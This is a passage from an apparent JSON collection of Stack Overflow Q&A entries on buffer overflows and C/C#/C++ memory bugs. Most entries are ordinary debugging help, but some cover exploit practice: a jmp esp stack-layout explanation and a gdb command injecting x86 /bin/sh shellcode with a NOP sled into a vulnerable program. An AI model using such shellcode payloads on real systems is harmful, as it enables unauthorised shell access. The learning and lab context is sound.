0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  